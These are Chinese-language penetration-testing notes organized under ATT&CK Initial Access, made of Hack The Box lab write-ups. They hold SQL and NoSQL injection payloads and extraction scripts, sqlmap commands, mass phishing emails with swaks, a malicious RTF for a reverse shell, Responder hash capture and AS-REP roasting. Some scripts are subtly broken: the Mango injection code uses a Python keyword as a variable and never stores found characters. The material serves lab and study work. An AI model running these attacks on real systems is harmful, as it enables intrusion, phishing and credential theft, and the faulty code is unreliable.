# 2. Initial Access

## Exploit Public-Facing Application

**1**：

靶机Intense (10.10.10.195)。在获取网站源码后，发现`query_db("insert into messages values ('%s')" % message)  `存在SQLI，且后台数据库是SQLite 。确认SQLI后，准备dump出admin密码哈希，之后就是结合substr()函数自动化处理，详情参见Intense official writeup或[HTB：Intense](https://0xdf.gitlab.io/2020/11/14/htb-intense.html)。

```shell
# 返回OK
message=' and case when (1=1) then 1 else load_extension(1) end)-- -
# 返回not authorized
message=' and case when (1=2) then 1 else load_extension(1) end)-- -
# 确认admin存在
message=' and case when (select 1 from users where username='admin') then 1 else
load_extension(1) end)-- -
# 准备dump密码哈希
message=' and case when (select substr((select secret from users where username='admin'),1,1)='0') then 1 else load_extension(1) end)-- -
```

```python
import requests
import sys

chars = "0123456789abcdef"
url = "http://10.10.10.195/submitmessage"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
pass_hash = ""
for i in range(1, 65):
    for c in chars:
        sys.stdout.write(f"\r[+] Pass_hash: {pass_hash}{c}")
        sys.stdout.flush()
        resp = requests.post(url,
            data=f"message=' and case when (select substr((select secret from users where username = 'admin'), {i}, 1)='{c}') then 1 else load_extension(1) end)-- -",
            headers=headers,)
        if "OK" in resp.text:
            pass_hash += c
            break
```

**2**:

靶机Multimaster (10.10.10.179)。在路径`/api/getColleagues`处发现线索。

```shell
curl 'http://multimaster.htb/api/getColleagues' -H 'Accept: application/json, text/plain, */*' -H 'Content-Type: application/json;charset=utf-8' --data-raw '{"name":""}'
# result:
# [{"id":1,"name":"Sarina Bauer","position":"Junior Developer","email":"sbauer@megacorp.htb","src":"sbauer.jpg"},
# {"id":2,"name":"Octavia Kent","position":"Senior Consultant","email":"okent@megacorp.htb","src":"okent.jpg"}, ...]
```

带参数的总得试试SQLI，sqlmap一把梭，出不来。官方writeup有句话很重要：*Examination of the JSON RFC reveals that default encoding is UTF-8 , but it also supports UTF-16 and UTF-32 encoding. Let's try injecting a quote in UTF-16 format*。所以tamper选择charunicodeescape。

```shell
sqlmap -r burp.request --dbms=mssql --dbs --tamper=charunicodeescape -v 3 --level=3
```

**3**：

靶机Mango (10.10.10.162)。已知子域名`staging-order.mango.htb`，其主页为登陆页。抓包，POST参数为`username=&password=&login=login`。一般SQLI行不通，根据靶机名可以猜到 NoSQLI。脚本可以参考[Nosql injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)。

```python
'''dump all users'''
import requests
import string

user = ""
url = "http://staging-order.mango.htb/index.php"

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = 'username[$regex]=^%s&password[$ne]=1&login=login' % user
            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
            if r.status_code == 302:
                print("[+] Found one more char : %s" % (user + c))
                user + c
```

```python
'''dump admin pass'''
import requests
import string

pass = ""
url = "http://staging-order.mango.htb/index.php"

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = 'username=admin&password[$regex]=^%s&login=login' % pass
            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
            if r.status_code == 302:
                print("[+] Found one more char : %s" % (pass + c))
                pass + c
```

**4**：

靶机某某 (Active,not retired)。已知`http://machineIP/show.php?query=id&h=bfe31138f2d38085d891b972aca749ba`，怀疑有SQLI漏洞。一把梭出不来，手工检测网站提示检测到攻击，返回403。h参数的值长度为32，可能是MD5值。经过其他方法获得了salt。反复验证确认参数h值为MD5(salt+query)。

```shell
echo -n 'theSaltid' | md5sum
# bfe31138f2d38085d891b972aca749ba  -
sqlmap -u 'http://machineIP/show.php?query=id&h=bfe31138f2d38085d891b972aca749ba' --eval="import hashlib;h=hashlib.md5(b'theSalt'+bytes(query,'ascii')).hexdigest()" --dbs -v 3
```

## Phishing

​		HTB的钓鱼简单些，发送链接即可。相关知识点：[Phishing for Information](https://attack.mitre.org/techniques/T1598)，[Phishing](https://attack.mitre.org/techniques/T1566)

**1**: 

靶机SneakyMailer (10.10.10.197)。通过team.php可获取emails用户列表，再swaks钓鱼，获取账户密码。

```shell
curl http://sneakycorp.htb/team.php | grep -E "@sneakymailer.htb | cut -d'>' -f2 | cut -d'<' -f1 > mails.txt
cat mails.txt | while read mail; do swaks -to $mail -from admin@sneakymailer.htb -header "Subject: There is a problem with your account.Please login in to this now!" -body "http://yourHttpServer" -server 10.10.10.197; done
```

**2**: 

靶机Reel (10.10.10.77)。利用Office OLE2Link漏洞 [cve-2017-0199_toolkit.py](https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py) 生成RTF恶意文件，也可利用msf  exploit(windows/fileformat/office_word_hta) 模块生成恶意doc文档（rtf文件），再sendEmail发送。开启监听，get reverse shell。详情参考：[HTB: Reel Writeup](https://0xdf.gitlab.io/2018/11/10/htb-reel.html)

```shell
# attachment_phishing.doc from msf
{\rtf1\adeflang1025\ansi\ansicpg1252\uc1\adeff31507\deff0\stshfdbch31505\stshfloch31506\stshfhich31506\stshfbi31507\deflang1033\deflangfe2052\themelang1033\themelangfe2052\themelangcs0
{\info
{\author Microsoft}
{\operator Microsoft}
}
{\*\xmlnstbl {\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}
{
{\object\objautlink\objupdate\rsltpict\objw291\objh230\objscalex99\objscaley101
{\*\objclass Word.Document.8}
{\*\objdata 010500000000000000000000000000000000000000000
......
0105000000000000}
{\result {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid1979324 }}}}
{\*\datastore }
}
```

```shell
sendEmail -f test@megabank.com -t target@megabank.com -u "Subject" -m "Body" -a attachment_phishing.doc -s 10.10.10.77
```

**3**: 

靶机Reel2 (10.10.10.210)。侦察出`https://reel2.htb/owa`，且通过其他手段获取了某用户与密码。登陆owa，新建邮件，address book的所有用户加入到接收者，正文`http://tun0's Ip`，发送即可。

```shell
responder -I tun0
```

之后接收到某一用户的NTLMv2 Hash，再用john或hashcat破解。相关知识点：[NetNTLMv2 hash stealing using Outlook](https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook)

# Valid Accounts

**1**：

靶机Registry (10.10.10.159)。侦察探测出`http://docker.registry.htb/v2`，且弱密码admin可以登录。发现仓库，再下载blob，获得ssh账户密码。相关知识点[Default Accounts](https://attack.mitre.org/techniques/T1078/001/)。

```shell
curl -ik -u admin:admin https://docker.registry.htb/v2/_catalog
# {"repositories":["bolt-image"]} 
curl -ik -u admin:admin https://docker.registry.htb/v2/bolt-image/manifests/latest
# blob...
```

**2** :

靶机Blackfield (10.10.10.192)。端口53、135、389、445、3268、5985开放，且域为BLACKFIELD.LOCAL。首先探测匿名或guest用户是否可访问SMB shares。相关知识点[Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)。

```shell
smbmap -u guest -H 10.10.10.192  
```

之后通过`smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }'`获取users.txt。枚举是否有设置属性为`UF_DONT_REQUIRE_PREAUTH`的用户，并获取其TGT再john爆破。至此有了域账户和密码，可以bloodhound枚举AD。在这之前最好用ldapsearch查看有哪些用户哪些组，有时直接定位`Remote Management Users`组的用户可以省时间，便于evil-winrm登录。

总结：一般而言，拿到了某个域用户与密码，可以直接先试试bloodhound、ldapsearch与evil-winrm。

```shell
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
john user.hash --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
bloodhound-python -u user -p 'pass' -d blackfield.local -ns 10.10.10.192 -c DcOnly

ldapsearch -x -h 10.10.10.192 -D 'blackfield\user' -w 'pass' -b "DC=blackfield,DC=local" > ldap.out
```

**Todo**: ...
